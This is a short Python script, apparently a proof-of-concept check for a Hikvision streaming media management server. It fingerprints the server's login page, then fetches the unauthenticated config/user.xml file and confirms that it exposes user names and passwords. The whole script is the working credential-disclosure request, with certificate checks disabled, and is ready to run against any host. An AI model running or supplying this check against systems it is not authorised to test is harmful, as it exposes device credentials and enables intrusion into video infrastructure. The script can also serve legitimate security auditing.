import requests,re,urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def doCheck(baseurl):
	if baseurl[-1]=='/':
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
	response=requests.get(url,headers=headers,timeout=5,verify=False)
	response.encoding='utf-8'
	if response.status_code == 200 and "<TITLE>流媒体管理服务器</TITLE>" in response.text and "海康威视" in response.text:
		r0=True
	else:
		r0=False
	url=baseurl+"config/user.xml"
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
	response=requests.get(url,headers=headers,timeout=5,verify=False)
	if response.status_code == 200 and "<user name=\"" in response.text and " password=\"" in response.text:
		r1=True
	else:
		r1=False
	if r0 and r1:
		return True
	else:
		return False
